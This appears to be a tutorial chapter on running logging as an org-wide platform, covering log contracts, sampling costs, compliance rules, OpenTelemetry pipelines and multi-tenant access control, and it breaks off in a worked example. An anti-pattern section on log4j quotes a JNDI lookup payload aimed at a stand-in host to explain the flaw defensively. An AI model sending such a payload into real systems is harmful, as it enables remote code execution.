# Logging — Professional (Staff / Principal) Level

<!-- level-focus -->
At professional level, focus on this question:

> How should teams adopt and operate **Logging — Professional (Staff / Principal) Level** with measurable outcomes and limited coordination?

Use the smallest realistic scenario that exposes the decision and its failure behavior.
> **Topic:** [Logging Roadmap](README.md)
> **Focus:** Logging as a *platform*. Org-wide standards, cost engineering, compliance, OpenTelemetry unification, multi-tenant isolation, and the platform-team contract behind a 200-service deployment.

---

## Core Concepts

### 1. Logging is no longer a library — it is a platform product

At this level, the question shifts from *"which logger should I use?"* to *"what does my company's logging platform offer to its internal customers, and at what SLO and price?"* The deliverable is a **platform service** with a roadmap, an on-call rotation, dashboards, and a charge model.

### 2. The contract is a one-pager, enforced at the edge

You publish: *"emit JSON to stdout with these fields; everything else is our problem."* Then you enforce it at the collector with a schema processor — drop or quarantine non-compliant lines. The contract is short on purpose; long contracts get ignored.

### 3. Cost is a first-class design constraint

A logging system that ingests every line is a logging system that bankrupts the company. Sampling, tiered retention, and per-team budgets are not optimizations — they are *requirements*.

### 4. Compliance is not optional

GDPR, HIPAA, SOC 2, and PCI DSS are not "the legal team's problem." They impose concrete constraints on **what your logs may contain**, **how long they live**, **who may read them**, and **whether they can be modified**. A staff engineer who does not know these constraints will design a system that fails audit and ships PII to a foreign data center.

### 5. Logs, metrics, and traces are converging

OpenTelemetry treats them as three views of the same event. The Observability 2.0 school (Honeycomb) goes further: there are only wide events, and metrics/logs/traces are queries over them. Both views demand that your platform be vendor-agnostic at the wire format.

### 6. Multi-tenancy is the hardest part

In a SaaS, every log line belongs to a tenant. Mixing tenants in shared indexes saves money but creates ACL and exfiltration risks. Per-tenant indexes save the ACL problem but explode operational cost. The right answer is almost always *per-tenant field with row-level ACL*.

### 7. Libraries don't own loggers, applications do

A library that instantiates its own logger fights with the host application. The correct pattern is **dependency injection** of a known interface (`slog.Logger`, `org.slf4j.Logger`, `structlog.BoundLogger`).

### 8. The platform team has its own SLOs

Ingestion latency, drop rate, end-to-end log freshness, query availability, schema-conformance rate — these are tracked, alerted, and reported like any other product SLO.

---

## Logging as a Platform

### The platform-team contract

A staff-level deliverable is a literal one-pager. Here is the canonical form:

```text
ORG LOGGING CONTRACT v3.2
─────────────────────────────────────────────────────────
You (the service team):
  - Emit JSON Lines to stdout, one event per line, UTF-8.
  - Include the 9 mandatory fields below.
  - Never include any field on the Forbidden List.
  - Use the org logging SDK (golang/python/java/node) so
    redaction and field naming happen for free.

We (the platform team):
  - Collect from stdout via the node agent.
  - Enrich with resource attributes (host, region, k8s.*).
  - Run schema lint; quarantine non-compliant lines.
  - Sample at the tail; route by severity to hot/warm/cold.
  - Provide query UI, alerting, and a 13-month archive.
  - Publish an SLO of 99.9% ingestion, p95 < 30s freshness.

Mandatory fields:
  timestamp        RFC3339 with nanoseconds
  severity         one of TRACE,DEBUG,INFO,WARN,ERROR,FATAL
  service.name     dot-namespaced, e.g. payments.charges
  service.version  semver
  deployment.env   prod|staging|dev
  region           e.g. us-east-1
  request_id       UUID v4 per inbound request
  trace_id         W3C traceparent
  span_id          W3C traceparent

Conditionally required:
  tenant_id        if multi-tenant
  user_id          hashed; never raw email/phone

Forbidden:
  Raw PII, secrets, JWTs, full credit card numbers,
  PHI, multi-line stack traces without escaping.
─────────────────────────────────────────────────────────
```

### The "logging library wrapper" approach

Rather than letting each team adopt `zap`, `zerolog`, `logrus`, `slog`, etc. independently, ship an **internal SDK** that wraps the chosen logger. The wrapper:

- Hard-codes field names from the contract.
- Refuses to log forbidden field names (or silently redacts them).
- Auto-injects `service.name`, `service.version`, `region` from env.
- Reads `trace_id`/`span_id` from the current context.
- Exposes a tiny surface area: `log.Info(ctx, "event", attrs...)`.

This is not "not invented here." It is **field-name discipline at the edge**. Without it, your indexes have `req_id`, `requestId`, `request_id`, `correlation_id`, and `cid` all meaning the same thing, and joins become impossible.

### Per-team vs central schema ownership

Two extremes:

- **Central** — one team owns every field name. Strong consistency, slow innovation.
- **Per-team** — each team picks. Fast, but joinability dies.

The professional answer is **federated schema** — the platform team owns the *mandatory core* (the 9 fields above), and each team owns its own *namespace* (`payments.*`, `auth.*`). The collector enforces "core" but lets teams extend within their prefix.

### "JSON to stdout, we handle the rest"

The transport contract is deliberately boring. Stdout works for: Kubernetes pods, Docker containers, bare-metal systemd journals, Lambda, ECS, Cloud Run. Every node agent (Fluent Bit, Vector, OTel Collector) reads it. No team needs an SDK that "knows about Datadog." That decoupling is what lets you swap vendors in a quarter.

---

## Cost Engineering

### The $4M/year case study

A real number from a SaaS that grew to 100k req/s on Datadog Logs (pricing approx $1.27/GB ingested + retention):

```text
Logs/sec                  ≈ 100,000
Avg bytes/log             ≈ 800 (structured JSON, full context)
Bytes/sec                 ≈ 80 MB
Bytes/day                 ≈ 6.9 TB
Bytes/month               ≈ 207 TB
Datadog cost @ $1.27/GB   ≈ $263k/month  ≈ $3.16M/yr
+ 30 day retention        ≈ +$0.6M/yr
+ live tail / index tiers ≈ +$0.3M/yr
                          ─────────
Total                     ≈ $4.0M/yr
```

After introducing **tail-based sampling** (keep 100% of errors, 100% of slow requests >1s, 1% of normal requests), volume dropped ~95%:

```text
Errors retained           100%   → ~1% of traffic = 1k/s
Slow retained             100%   → ~0.5% of traffic = 0.5k/s
Sampled normal            1%     → 1k/s
Total retained            ~2.5k/s vs 100k/s original
Cost                      ~$100k–$200k/yr
Savings                   ~$3.8M/yr
```

**The lesson:** the most expensive log line is the one nobody ever queries. A staff engineer's job is to find the 95% no one queries and stop paying for it.

### Per-team log budgets and chargeback

Once you have per-team field tagging (`service.name`), you can compute monthly GB per team and bill internally. Two models:

- **Showback** — dashboards show cost; no money moves. Cultural pressure only. Works in small orgs.
- **Chargeback** — actual budget allocation. Teams over budget either reduce volume or pay from their own org budget. Works at >500 engineers when finance is involved.

Without budgets, the tragedy of the commons is universal: every team's logs are *the platform's problem* until the CFO sees the bill.

### "1% of debug at the right moment beats 100% of info forever"

The most useful log line is the DEBUG line from the 1 service involved in the incident, during the 30 minutes the incident lasted. Storing 100% DEBUG forever to capture that is the wrong design. Instead:

- DEBUG is **off by default** in production.
- A control plane lets SREs flip DEBUG on for a specific service for a window (e.g. 30 minutes).
- The platform automatically reverts.

This is sometimes called **dynamic log levels** or **on-demand verbosity**. It is a feature your platform should ship.

### Vendor cost models

| Vendor | Charges on | Cost lever | Watch out for |
|---|---|---|---|
| Datadog Logs | GB ingested + indexed days | Sampling, retention tiers | "Live tail" is per-GB on top |
| Splunk | GB indexed/day | Index allowlist, summary indexing | License overage fees |
| Sumo Logic | GB ingested | Pre-filter at collector | Continuous queries |
| Elastic Cloud | Storage + compute | Hot/warm/cold tiers, ILM | Search costs spike unbounded |
| Grafana Loki | Query volume + storage | Cheap storage, expensive aggregations | Cardinality on labels |
| Honeycomb | Events ingested | Sampling | Wide events are the model |
| AWS CloudWatch Logs | Ingest + storage | Log group retention | Cross-region transfer |

Knowing the *axis of billing* is the entire game. If you pay per GB, sample. If you pay per query, denormalize. If you pay per indexed field, use field allowlists.

---

## Compliance-Grade Logging

### GDPR — what your logs must NOT contain

GDPR Article 30 requires you to maintain "records of processing activities" — essentially a catalog of where personal data lives. **If logs contain personal data, your log store is in scope.** That is expensive: data subject access requests (Article 15), right to erasure (Article 17), data residency (Article 44), all apply.

Practical rules:

- Never log raw email, phone, IP, full name, government ID, location data.
- Always hash/pseudonymize stable identifiers (`user_id_hash = sha256(user_id + salt)`).
- Log access patterns, not data values: log `user_id_hash=abc` accessed `record_type=invoice`, not the invoice contents.
- IP addresses are personal data under GDPR — truncate or hash before storage.

### HIPAA — audit logs for PHI

US healthcare. Every access to Protected Health Information must be logged with: **who** accessed, **what** record, **when**, **from where**, **why** (purpose code). These audit logs themselves are PHI and must be encrypted at rest and in transit. Retention: 6 years minimum.

**Architectural implication:** audit logs and application logs are two different systems. Application logs use the cheap platform pipeline; audit logs go to a hardened, append-only store with a separate ACL.

### SOC 2 audit log requirements

SOC 2 Type II requires "controls over access to systems and data" be auditable. In practice:

- Immutable audit log of admin actions, auth events, config changes.
- Retention typically 1 year minimum; many auditors expect 13 months to cover an annual review window.
- Access to audit logs is logged and reviewed quarterly.
- Logs include enough context to reconstruct the action (actor, target, before/after).

### PCI DSS

For systems handling cardholder data:

- Audit logs of all access to cardholder data.
- Log integrity (file integrity monitoring, hash chain) is explicit in requirement 10.5.
- 1 year retention, 3 months immediately available.
- Never log full PAN (primary account number), CVV, or PIN.

### Audit log vs application log lifecycle

| Dimension | Application logs | Audit logs |
|---|---|---|
| Volume | High (GB/day per service) | Low (MB/day per service) |
| Retention | 7–30 days hot, 90 days warm | 1–7 years |
| Mutability | Can be dropped, sampled, edited | Append-only, hash-chained |
| ACL | Engineering team + SRE | Security team + auditors only |
| Storage | Hot/warm tiered, cheap | WORM (write-once-read-many) or signed S3 Object Lock |
| Sampling | Yes, aggressively | Never |
| Format | Free-form JSON | Strict schema, often signed |

Confusing these two systems is the #1 audit-failure pattern.

---

## Structured Event Analytics (Observability 2.0)

The Honeycomb school, championed by **Charity Majors**, makes a sharp claim: traditional logging is dead, replaced by **wide structured events**.

### The thesis

Old observability is three pillars: logs, metrics, traces. Each is a lossy projection of reality. You can't *ask new questions* of metrics because they were pre-aggregated. You can't *cheaply query* logs because they're text. You can't *correlate* the three because they have different schemas.

Observability 2.0 says: emit **one wide event per unit of work** (e.g. per HTTP request, per job execution). That event has every available attribute — request size, user tier, db query count, cache hit rate, downstream latencies, version of every dependency. Metrics, dashboards, and traces are then **queries** over that table.

### The `event_type=` discipline

Every emitted event has a field `event_type` describing what unit of work it is: `event_type=http_request`, `event_type=job_run`, `event_type=cron_tick`. Filters and views are keyed off this. A wide event is *not* a log line — it is a row in an analytics table.

### High-cardinality fields as first-class

Old log systems (Elasticsearch with `keyword` indexing, Datadog with cardinality penalties) punish you for high-cardinality fields like `user_id`, `request_id`, `feature_flag_variant`. Honeycomb's columnar engine doesn't. That changes what you can debug: you can ask *"show me all requests from user X in the last hour where the third-party API took >500ms"* in real time.

### When this replaces traditional logging

It replaces it when:

- Your debugging questions are *"why is this specific user/request slow?"*
- You already have OpenTelemetry traces — wide events are basically annotated spans.
- You can afford a columnar event store (Honeycomb, ClickHouse, Snowflake events).

It does **not** replace traditional logging when:

- You need verbose DEBUG-level streams of arbitrary library output.
- You have audit logs (those have hard schemas).
- You're stuck on legacy infra that only writes text to stderr.

### Charity Majors' "observability without unknowns" thesis

The point isn't to dashboard the things you know are broken. It's to be able to answer *any question* about your production system, including questions you didn't know to ask until 3am. Wide events with high cardinality are the only known way to do that affordably.

---

## OpenTelemetry Logs — The Unification

OpenTelemetry (OTel) is the CNCF standard for telemetry. Its **logs data model** is the convergence point the whole industry is migrating to.

### The OTel logs data model

A log record has:

| Field | Meaning |
|---|---|
| `timestamp` | Event time |
| `observed_timestamp` | When the collector received it (for clock-skew detection) |
| `severity_number` | 1–24 numeric (TRACE=1, DEBUG=5, INFO=9, WARN=13, ERROR=17, FATAL=21) |
| `severity_text` | "INFO", "ERROR" — for humans |
| `body` | Either a string or a structured map |
| `attributes` | Free-form key/value, per-record |
| `trace_id` / `span_id` | W3C trace context, automatic if instrumented |
| `resource` | Attributes about the *emitter* (service, host, region) — set once per process |
| `instrumentation_scope` | Library that produced this record (e.g. `org.example.payments`) |

### Logs and traces share the same context

Because `trace_id` and `span_id` are first-class in the log model, a log emitted inside a span automatically joins. Click a span in a trace UI → see all logs in that span. This eliminates the manual `request_id` plumbing you did at middle level.

### OTel Collector pipelines

The collector is a vendor-neutral agent that runs as a sidecar, daemonset, or gateway. Its config has three stages:

```yaml
# receivers: where logs come from
# processors: transforms applied in order
# exporters: where logs are sent
receivers:
  otlp:
    protocols:
      grpc: { endpoint: 0.0.0.0:4317 }
  filelog:
    include: [/var/log/pods/*/*/*.log]
    operators:
      - type: json_parser

processors:
  batch:
    timeout: 5s
    send_batch_size: 1000
  attributes/redact:
    actions:
      - key: email
        action: hash
      - key: password
        action: delete
  filter/drop_debug:
    logs:
      log_record:
        - 'severity_number < SEVERITY_NUMBER_INFO and resource.attributes["deployment.env"] == "prod"'
  resource/enrich:
    attributes:
      - key: region
        value: ${env:AWS_REGION}
        action: insert
  tail_sampling:
    decision_wait: 30s
    policies:
      - { name: errors, type: status_code, status_code: { status_codes: [ERROR] } }
      - { name: slow,   type: latency,     latency: { threshold_ms: 1000 } }
      - { name: prob,   type: probabilistic, probabilistic: { sampling_percentage: 1 } }

exporters:
  otlphttp/datadog:
    endpoint: https://http-intake.logs.datadoghq.com
    headers: { DD-API-KEY: ${env:DD_API_KEY} }
  loki:
    endpoint: http://loki:3100/loki/api/v1/push
  file/audit:
    path: /mnt/audit/audit.jsonl
    rotation: { max_megabytes: 100 }

service:
  pipelines:
    logs/application:
      receivers: [otlp, filelog]
      processors: [resource/enrich, attributes/redact, filter/drop_debug, batch]
      exporters: [otlphttp/datadog, loki]
    logs/audit:
      receivers: [otlp]
      processors: [resource/enrich, batch]
      exporters: [file/audit]
```

The two pipelines — `logs/application` and `logs/audit` — share receivers but diverge in policy. Application logs get sampled and shipped to vendors; audit logs go untouched to durable storage.

### "Instrument once, send anywhere"

The single biggest argument for OTel: your application code emits OTel-shaped records. The collector decides where they go. Switching from Datadog to Splunk becomes a collector config change, not a 200-service migration. That decoupling is worth the migration cost.

### Migration paths

| Stack | Pre-OTel | OTel path |
|---|---|---|
| Java / SLF4J | Logback → Datadog appender | SLF4J → OpenTelemetry appender bridge → OTLP |
| Python | `logging` → JSON formatter → stdout | `logging` + `OpenTelemetryHandler` → OTLP |
| Go | `slog` or `zap` → stdout | `slog` + `otelslog` bridge → OTLP |
| Node | `pino` → stdout | `pino-opentelemetry-transport` → OTLP |
| Rust | `tracing` → JSON | `tracing-opentelemetry` → OTLP |

The pattern is always the same: a thin bridge from your existing logger into the OTel SDK, then OTLP out the door.

---

## Multi-Tenant Logging

In a SaaS, every log line belongs to *some tenant*. Getting this wrong is how you end up with tenant A's data showing in tenant B's debug dashboard. That is an incident, and depending on the data, possibly a breach.

### Per-tenant indexes vs per-tenant fields

| Approach | Pros | Cons |
|---|---|---|
| **Index per tenant** | Strong isolation; per-tenant retention/ACL easy | Index sprawl; ops cost scales with tenants; cross-tenant queries hard |
| **Field per tenant (`tenant_id` filter)** | Cheap; cross-tenant queries trivial | ACL enforced by query layer — one bug = leak |
| **Hybrid: hot tier sharded by tenant, cold tier shared** | Best of both | Two systems to maintain |

The pragmatic answer for most SaaS: **single index, `tenant_id` field, ACL enforced at the query proxy**. Combine with row-level encryption for highly sensitive tenants.

### Per-tenant access control

The query proxy (Grafana, Kibana, or a custom layer) injects `tenant_id IN (...)` into every query, based on the user's group membership. Users can never bypass — even raw API calls go through the proxy. The proxy itself logs every query (meta-audit) so an audit shows who saw what.

### Cross-tenant queries (security team needs this)

The security team needs to ask: *"is anyone seeing 4xx spikes across all tenants?"* That requires bypassing the tenant filter. The right design:

- A separate role `security-incident-responder` can run cross-tenant queries.
- Every such query is logged with a justification field (`incident_id`).
- Quarterly review of cross-tenant queries.

This is the **break-glass procedure** for log access.

### Tenant ID propagation through async boundaries

The hardest part. Tenant ID enters at the edge (from JWT, header, or subdomain). It must flow through:

- HTTP middleware → handler → service → repository → log.
- Async jobs (queue messages carry `tenant_id` as header).
- Cron jobs that touch one tenant (set `tenant_id` in job context).
- Cron jobs that touch many tenants (set `tenant_id` per iteration; never log unscoped).

Use the same machinery as `trace_id` — context propagation. Any code path that doesn't carry `tenant_id` should be unable to call the logger.

---

## Designing Logging for an SDK or Library

A library that prints to stdout, instantiates its own logger, or hardcodes a format is a library that breaks its caller's observability pipeline.

### The rules

1. **Do not instantiate a logger.** Accept one from the caller, or look up a known interface in context.
2. **Default to a no-op logger if none provided.** Never crash because the caller didn't configure logging.
3. **Use the host's standard interface.** Go: `*slog.Logger`. Java: `org.slf4j.Logger`. Python: `logging.Logger`. Node: any with `.info/.warn/.error`. Rust: the `log` crate facade.
4. **Don't log secrets, ever.** Even if the caller might. Redact aggressively before passing values into log args.
5. **Use structured key/value, not formatted strings.** Lets the caller route/filter.
6. **Log sparingly at INFO; verbosely at DEBUG.** A library spewing INFO into every caller's logs is hostile.
7. **Use a stable logger name.** `org.example.mylib` — lets callers configure level per library.

### "Log to your caller's logger" — code

```go
package mylib

import (
    "context"
    "log/slog"
)

type Client struct {
    log *slog.Logger
}

type Option func(*Client)

func WithLogger(l *slog.Logger) Option {
    return func(c *Client) { c.log = l }
}

func New(opts ...Option) *Client {
    c := &Client{log: slog.New(slog.DiscardHandler)} // no-op default
    for _, o := range opts {
        o(c)
    }
    return c
}

func (c *Client) DoThing(ctx context.Context, id string) error {
    c.log.DebugContext(ctx, "mylib.do_thing.start", slog.String("id", id))
    // ... business logic
    return nil
}
```

The library's caller controls the logger, the format, the level, and the destination. The library only chooses *what* to log, never *how*.

---

## Code Examples

### Go — slog with OTel bridge and resource attributes

```go
package main

import (
    "context"
    "log/slog"
    "os"

    "go.opentelemetry.io/contrib/bridges/otelslog"
    "go.opentelemetry.io/otel/log/global"
    sdklog "go.opentelemetry.io/otel/sdk/log"
    "go.opentelemetry.io/otel/sdk/resource"
    semconv "go.opentelemetry.io/otel/semconv/v1.26.0"
)

func main() {
    res, _ := resource.New(context.Background(),
        resource.WithAttributes(
            semconv.ServiceName("payments.charges"),
            semconv.ServiceVersion("2.7.1"),
            semconv.DeploymentEnvironment("prod"),
        ),
    )
    provider := sdklog.NewLoggerProvider(sdklog.WithResource(res))
    global.SetLoggerProvider(provider)
    defer provider.Shutdown(context.Background())

    logger := otelslog.NewLogger("payments")
    slog.SetDefault(logger)

    ctx := context.Background()
    logger.InfoContext(ctx, "charge.requested",
        slog.String("event_type", "charge_requested"),
        slog.String("tenant_id", "acme"),
        slog.Int64("amount_cents", 1999),
    )

    if err := charge(ctx); err != nil {
        logger.ErrorContext(ctx, "charge.failed",
            slog.String("event_type", "charge_failed"),
            slog.Any("error", err),
        )
        os.Exit(1)
    }
}

func charge(ctx context.Context) error { return nil }
```

### Python — `logging` + OTel handler

```python
import logging
import os

from opentelemetry import trace
from opentelemetry._logs import set_logger_provider
from opentelemetry.sdk._logs import LoggerProvider, LoggingHandler
from opentelemetry.sdk._logs.export import BatchLogRecordProcessor
from opentelemetry.exporter.otlp.proto.grpc._log_exporter import OTLPLogExporter
from opentelemetry.sdk.resources import Resource

resource = Resource.create({
    "service.name": "payments.charges",
    "service.version": "2.7.1",
    "deployment.environment": "prod",
    "region": os.environ.get("AWS_REGION", "us-east-1"),
})
provider = LoggerProvider(resource=resource)
provider.add_log_record_processor(BatchLogRecordProcessor(OTLPLogExporter()))
set_logger_provider(provider)

logging.basicConfig(level=logging.INFO, handlers=[LoggingHandler()])
log = logging.getLogger("payments")

tracer = trace.get_tracer(__name__)

def charge(tenant_id: str, amount_cents: int) -> None:
    with tracer.start_as_current_span("charge") as span:
        log.info("charge.requested",
                 extra={"event_type": "charge_requested",
                        "tenant_id": tenant_id,
                        "amount_cents": amount_cents})
        # trace_id and span_id flow automatically into the log record
        try:
            do_work()
        except Exception:
            log.exception("charge.failed",
                          extra={"event_type": "charge_failed",
                                 "tenant_id": tenant_id})
            raise

def do_work() -> None:
    pass

if __name__ == "__main__":
    charge("acme", 1999)
```

### Java — SLF4J + Logback + OTel appender

```java
package com.example.payments;

import io.opentelemetry.api.GlobalOpenTelemetry;
import io.opentelemetry.api.trace.Span;
import io.opentelemetry.api.trace.Tracer;
import net.logstash.logback.argument.StructuredArguments;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class ChargeService {
    private static final Logger log = LoggerFactory.getLogger(ChargeService.class);
    private final Tracer tracer = GlobalOpenTelemetry.getTracer("payments");

    public void charge(String tenantId, long amountCents) {
        Span span = tracer.spanBuilder("charge").startSpan();
        try (var scope = span.makeCurrent()) {
            log.info("charge.requested",
                StructuredArguments.kv("event_type", "charge_requested"),
                StructuredArguments.kv("tenant_id", tenantId),
                StructuredArguments.kv("amount_cents", amountCents));
            doWork();
        } catch (RuntimeException e) {
            log.error("charge.failed",
                StructuredArguments.kv("event_type", "charge_failed"),
                StructuredArguments.kv("tenant_id", tenantId), e);
            throw e;
        } finally {
            span.end();
        }
    }

    private void doWork() { /* ... */ }

    public static void main(String[] args) {
        new ChargeService().charge("acme", 1999L);
    }
}
```

Logback's `logback.xml` then wires an OTel appender that bridges every event into OTLP.

### Rust — `tracing` + OTel

```rust
use opentelemetry::global;
use opentelemetry_otlp::WithExportConfig;
use opentelemetry_sdk::Resource;
use tracing::{error, info, instrument};
use tracing_subscriber::layer::SubscriberExt;
use tracing_subscriber::util::SubscriberInitExt;

#[instrument(skip_all, fields(tenant_id = %tenant_id, amount_cents))]
fn charge(tenant_id: &str, amount_cents: i64) -> Result<(), String> {
    info!(event_type = "charge_requested", "charge requested");
    do_work().map_err(|e| {
        error!(event_type = "charge_failed", error = %e, "charge failed");
        e
    })
}

fn do_work() -> Result<(), String> { Ok(()) }

fn main() {
    let exporter = opentelemetry_otlp::new_exporter()
        .tonic()
        .with_endpoint("http://otel-collector:4317");
    let resource = Resource::new(vec![
        opentelemetry::KeyValue::new("service.name", "payments.charges"),
        opentelemetry::KeyValue::new("service.version", "2.7.1"),
    ]);
    let provider = opentelemetry_otlp::new_pipeline()
        .logging()
        .with_exporter(exporter)
        .with_resource(resource)
        .install_batch(opentelemetry_sdk::runtime::Tokio)
        .unwrap();
    global::set_logger_provider(provider);

    tracing_subscriber::registry()
        .with(tracing_subscriber::fmt::layer().json())
        .with(opentelemetry_appender_tracing::layer::OpenTelemetryTracingBridge::new(
            &global::logger_provider(),
        ))
        .init();

    let _ = charge("acme", 1999);
}
```

All four examples follow the same pattern: a known logger interface, structured key/value, automatic context propagation, OTLP exit.

---

## Coding Patterns

### Pattern — Schema lint at the collector

Reject or quarantine logs that violate the contract. Drop unauthorized fields; alert on schema-drift rates.

```yaml
processors:
  transform/schema_lint:
    log_statements:
      - context: log
        statements:
          - drop() where attributes["event_type"] == nil
          - delete_key(attributes, "email")
          - delete_key(attributes, "ssn")
          - set(attributes["schema_violation"], true) where resource.attributes["service.version"] == nil
```

### Pattern — Dynamic log level via control plane

Expose `/debug/loglevel` on each service, gated behind SRE auth. Allow setting level for N minutes; auto-revert.

### Pattern — Wide event per unit of work

One `event_type=http_request` event at the end of each request, with every interesting attribute. Replaces a dozen INFO lines.

### Pattern — Shadow write during migration

Emit to old pipeline (`stdout`-Fluentd-Elasticsearch) and new (`stdout`-OTel-Datadog) simultaneously. Diff query results over a week. Cut over when parity is >99.9%.

### Pattern — Per-tenant ACL injector

A query proxy that rewrites every query with `tenant_id IN (user.tenant_ids)`. Users cannot bypass the rewrite even via raw API.

---

## Anti-Patterns at Professional Level

### 1. "We log everything"

Storage is cheap; *understanding* is not. Drowning in data without a contract or sampling means your search bar is useless. The fix is the contract + tail sampling + wide events.

### 2. Logs that contain PII because no one designed redaction

Engineers add `log.Info("user", user)` without thinking. The `User` struct serializes email, phone, address. Six months later, your GDPR officer files a breach notification. **Fix:** make the SDK refuse to log forbidden field names and forbid `%+v`-style struct dumps in code review.

### 3. Field-name drift across services

Service A logs `req_id`, B logs `requestId`, C logs `request_id`, D logs `correlation_id`. Joining a request across all four is impossible. **Fix:** the org SDK uses the contract's name, and the schema lint drops the others.

### 4. Multi-line stack traces breaking JSON parsers

`logger.error(stack_trace)` prints 40 lines, each parsed as a separate record. The downstream JSON parser explodes. **Fix:** either escape the stack into a single field, or use a multi-line collector config (`multiline.start_pattern`).

### 5. Inconsistent severity semantics

Team A logs `ERROR` for any failed request; Team B logs `ERROR` only when the system is broken. Cross-service "error rate" dashboards become meaningless. **Fix:** publish severity definitions in the contract. `ERROR` = the service failed to do its job, not the user mistyped a password.

### 6. "We can't change loggers — everything depends on the format"

The classic lock-in. The fix is to **never let the format become the API**. Apps emit a structured interface (OTel); the collector decides the format. Swap formats by changing the collector.

### 7. Alerting on log strings

`if grep ERROR | wc -l > 100: page`. Log-grepping is fragile; refactor a log line and your alert silently breaks. **Fix:** convert log lines to metrics (Prometheus counter, OTel meter) at the collector, then alert on the metric. The metric has SLOs; the log line is just narrative.

### 8. "We'll store everything in Elasticsearch"

ES is a search engine, not a cheap log store. Past ~1 TB/day, costs and ops pain explode. **Fix:** tiered storage. Recent + searched data in ES/Loki; older or rarely-queried in S3/GCS with on-demand search (Athena, BigQuery).

### 9. log4j-style RCE (CVE-2021-44228)

The infamous `log4j` flaw: log message strings were interpolated through JNDI lookup, so logging an attacker-controlled string like `${jndi:ldap://evil/x}` triggered remote class loading. The vulnerability lived because **the logger was doing more than logging**. Principles:

- Never let untrusted input influence the *behavior* of the logger, only its *content*.
- Disable feature flags in loggers (lookups, expressions) unless you need them.
- Log forced-quote user input; never raw.

### 10. Local timezones in logs

Logs from us-east-1 show `14:30 EST`, from eu-west-1 show `14:30 CET`. Correlation becomes a timezone math exercise. **Fix:** always RFC 3339 UTC with nanoseconds. The contract enforces it.

### 11. Logs as the only debuggable surface

If logs are the only way to debug your service, your service is under-instrumented. Traces and metrics should cover the structural questions; logs handle the narrative.

---

## Migrating an Old Logging System

A staff-level migration is usually a year-long effort. The phased plan:

```text
Phase 1 — Standardize timestamps  (week 1–4)
  Every service emits RFC3339 UTC nanoseconds.
  Audit with collector processor.

Phase 2 — Standardize JSON         (week 4–12)
  Every service emits one JSON object per line.
  Replace printf-style log lines with structured calls.

Phase 3 — Mandatory fields         (week 12–24)
  Add the 9 mandatory fields via the org SDK.
  Quarantine non-compliant lines but don't drop yet.

Phase 4 — Add request_id / trace_id (week 24–32)
  Instrument middleware to inject context.
  Backfill cross-service correlation.

Phase 5 — Tail-based sampling      (week 32–40)
  Enable in staging; verify error capture rate.
  Enable in prod 1% → 10% → 100%.

Phase 6 — Decommission old pipeline (week 40–52)
  Shadow-write for 4 weeks.
  Compare query results.
  Sunset old indexes, archive cold copies.
```

### "Boundary first" — start at the edge

The edge services (ingress, API gateway, auth) are where requests enter. Standardizing them first gives you a known-good source of `request_id` that flows everywhere. Trying to standardize a leaf service first is wasted effort because its upstream still emits chaos.

### Shadow-write pattern

For 2–4 weeks, emit to both old (Fluentd → ES) and new (OTel Collector → Datadog). Run the same query on both. Track:

- Volume parity (within 1%).
- Field presence (mandatory fields ≥ 99.9%).
- Query result divergence (errors found in one but not the other).

Cut over only when parity is solid.

### Decommissioning old indexes

The mistake: deleting too soon. The right order:

1. Stop *writing* to the old index.
2. Wait through the retention period (e.g. 30 days) — queries may still come.
3. Export a final snapshot to S3 Glacier (compliance-grade archive).
4. Verify archive integrity (hash, sample restore).
5. Delete the index.
6. Document the archive location and key.

---

## Team-Level Practice

### Code review rubric for logs (10 items)

Use this as a checklist in PR reviews. Block PRs that fail more than 2.

1. Is every log line structured (no `printf` concatenation)?
2. Does the line have a stable `event_type` so it can be grouped?
3. Are field names from the org schema (no `req_id` if contract says `request_id`)?
4. Does the line include `tenant_id` if the operation is tenant-scoped?
5. Is severity appropriate (no `ERROR` for expected business outcomes)?
6. Are there secrets, PII, JWTs, or full PANs anywhere in the line?
7. Is `ctx` passed so trace/span IDs propagate?
8. Is the line worth the cost — would a metric or a span event be better?
9. Will this line still be readable in 6 months without seeing the surrounding code?
10. If this fires at 3 am, does it give enough context to act, or does it just say "something happened"?

### "Will this be readable in 6 months?"

A senior heuristic that becomes a *required* check at staff level. The on-call engineer at 3 am has never seen this code. The log line must be intelligible alone. Avoid abbreviations only the author knows (`tx_st=3`). Spell out (`transaction_state="pending_capture"`).

### Logging in tests

- **Unit tests:** mostly no. Tests should assert on behavior, not log content. Asserting on log strings makes tests brittle.
- **Integration tests:** yes, attach the same logging pipeline, verify mandatory fields. Treat the test as a customer.
- **Test the logging contract itself:** a contract test that takes a sample log line from each service and runs it through the schema lint.

### Log review as post-mortem step

Every post-mortem includes a step: *"were the logs sufficient to debug this?"* Capture:

- Lines that should have existed but didn't.
- Lines that fired at the wrong severity.
- Lines that were dropped by sampling but were needed.
- Field-naming inconsistencies that slowed correlation.

Feed findings into the next iteration of the contract.

---

## Observability Platform-Team Responsibilities

The platform team owns the logging *product*. Its responsibilities:

### SLOs on the logging pipeline

| SLO | Target | Window |
|---|---|---|
| Ingestion availability | 99.9% | 30 days |
| End-to-end freshness p95 | < 30 seconds | 30 days |
| Drop rate (non-quarantine) | < 0.01% | 30 days |
| Query availability | 99.5% | 30 days |
| Schema conformance | > 99% | 7 days |

Track on a dashboard; alert on burn rate; budget error budget like any other service.

### Cost dashboards

Per-team monthly GB ingested. Per-service top 20 noisiest. Cardinality top 20 fields. Forecast vs budget. Surface trends *before* they become invoices.

### Schema enforcement

Run the schema lint processor in every collector. Quarantine non-compliant lines. Publish the violation rate per service. Make non-compliance a tracked metric, not a vibe.

### Tenant onboarding playbook

A new tenant or new internal team gets:

1. A namespace in the contract (`team.*` field prefix).
2. A log budget allocation (GB/month).
3. A starter SDK config tuned for their language.
4. An onboarding doc + a single Slack channel for questions.
5. A 1-month grace period before chargeback starts.

### Disaster recovery for archives

Audit logs are compliance assets. They have:

- An RPO (Recovery Point Objective) — how much data we can lose. Usually 0 for audit, hours for app logs.
- An RTO (Recovery Time Objective) — how fast we can restore. Usually days for cold archives.
- Cross-region replication.
- Quarterly restore tests — actually restore from archive and verify.

---

## Worked Example — 200-Service Org Logging Contract

Let's design the contract for a fictional org **"Lattice Corp"** — 200 microservices, 4 regions, 800 engineers, mixed Go/Python/Java/Node, SOC 2 + HIPAA in scope.

### Step 1 — Mandatory fields

The 9 from the canonical contract above, plus HIPAA-specific:

```text
+ phi_accessed   bool — true if this log line is in a code path that touched PHI
